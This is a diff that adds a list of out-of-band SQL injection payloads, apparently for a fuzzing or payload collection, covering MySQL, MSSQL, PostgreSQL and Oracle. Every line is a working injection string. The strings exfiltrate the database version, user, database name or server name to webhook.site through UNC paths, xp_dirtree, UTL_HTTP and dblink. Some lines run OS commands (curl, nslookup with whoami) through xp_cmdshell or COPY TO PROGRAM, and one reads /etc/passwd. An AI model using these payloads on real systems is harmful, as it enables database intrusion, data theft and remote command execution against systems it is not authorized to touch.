@@ -1,0 +1,25 @@
+1' LOAD_FILE(CONCAT('\\\\',(SELECT HEX(VERSION())),'.webhook.site\\test')) --
+1' LOAD_FILE(CONCAT('\\\\','.webhook.site\\test',(SELECT VERSION()))) --
+1' INTO OUTFILE '\\\\webhook.site\\test' --
+1' INTO DUMPFILE '\\\\webhook.site\\test' --
+1' LOAD_FILE(CONCAT('//',(SELECT USER()),'.webhook.site/test')) --
+1' OR LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.webhook.site\\test')) --
+1'; EXEC MASTER..XP_DIRTREE '\\webhook.site\test' --
+1'; EXEC MASTER..XP_SUBDIRS '\\webhook.site\test' --
+1'; EXEC MASTER..XP_FILEEXIST '\\webhook.site\test' --
+1'; EXEC MASTER..XP_CMDSHELL 'nslookup webhook.site' --
+1'; EXEC XP_DIRTREE '\\webhook.site\test' --
+1'; EXEC XP_CMDSHELL 'curl http://webhook.site/test' --
+1'; EXEC MASTER..SP_OACREATE 'Scripting.FileSystemObject', '\\webhook.site\test' --
+1'; DECLARE @host varchar(800); SELECT @host = '\\'+(SELECT @@servername)+'.webhook.site\test'; EXEC MASTER..XP_DIRTREE @host --
+1'; SELECT DBLINK_CONNECT('host=webhook.site port=80') --
+1'; SELECT UTL_HTTP.REQUEST('http://webhook.site/test/'||(SELECT VERSION())) --
+1'; SELECT DBLINK_CONNECT('host=webhook.site user=test password=test dbname=test') --
+1'; COPY (SELECT VERSION()) TO PROGRAM 'curl http://webhook.site/test/' --
+1'; COPY (SELECT USER) TO PROGRAM 'nslookup `whoami`.webhook.site' --
+1'; SELECT PG_READ_FILE('/etc/passwd') --
+1' AND UTL_HTTP.REQUEST('http://webhook.site/test/') IS NOT NULL --
+1' OR UTL_HTTP.REQUEST('http://webhook.site/test/'||(SELECT BANNER FROM V$VERSION)) IS NOT NULL --
+1' AND UTL_HTTP.REQUEST('http://webhook.site/test/'||(SELECT USER FROM DUAL)) IS NOT NULL --
+1' AND UTL_INADDR.GET_HOST_ADDRESS('webhook.site') IS NOT NULL --
+1' OR UTL_HTTP.REQUEST('http://webhook.site/test/'||(SELECT NAME FROM V$DATABASE)) IS NOT NULL --
